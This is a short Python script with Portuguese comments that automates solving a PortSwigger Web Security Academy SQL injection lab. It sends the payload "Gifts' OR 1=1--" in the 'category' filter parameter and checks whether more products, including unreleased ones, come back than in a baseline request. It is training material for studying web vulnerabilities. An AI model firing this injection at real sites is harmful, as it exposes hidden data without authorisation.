"""
[Bônus] Comando que resolve, de forma automatizada, o lab do PortSwigger
Web Academy "SQL injection vulnerability in WHERE clause allowing retrieval
of hidden data" (categoria: SQL injection).

Cada aluno recebe sua própria instância temporária do lab (ex.:
https://0a1b00xx00xx...web-security-academy.net), por isso o comando recebe
a URL base da instância do próprio usuário — nunca um alvo fixo de terceiros.
"""
import requests

from recon import REQUEST_TIMEOUT, ReconError

PAYLOAD = "Gifts' OR 1=1--"


def solve_sqli_lab(base_url: str) -> str:
    base_url = base_url.rstrip("/")
    url = f"{base_url}/filter"

    try:
        baseline = requests.get(url, params={"category": "Gifts"}, timeout=REQUEST_TIMEOUT)
        exploit = requests.get(url, params={"category": PAYLOAD}, timeout=REQUEST_TIMEOUT)
    except requests.RequestException as exc:
        raise ReconError(f"Falha ao acessar o lab: {exc}")

    if not exploit.ok:
        raise ReconError(f"Lab retornou HTTP {exploit.status_code} para o payload.")

    produtos_antes = baseline.text.count("<h3>")
    produtos_depois = exploit.text.count("<h3>")

    if produtos_depois > produtos_antes:
        return (
            "Lab resolvido! A injeção `' OR 1=1--` no parâmetro 'category' "
            f"fez a query retornar TODOS os produtos ({produtos_depois} itens, "
            f"contra {produtos_antes} da categoria original), incluindo os "
            "'unreleased products' que não deveriam ser listados.\n\n"
            f"Payload usado: category={PAYLOAD}"
        )

    raise ReconError(
        "Payload não confirmou o bypass (a página não retornou mais produtos "
        "que o baseline). Verifique se a URL corresponde a essa instância "
        "específica do lab 'SQL injection... retrieval of hidden data'."
    )
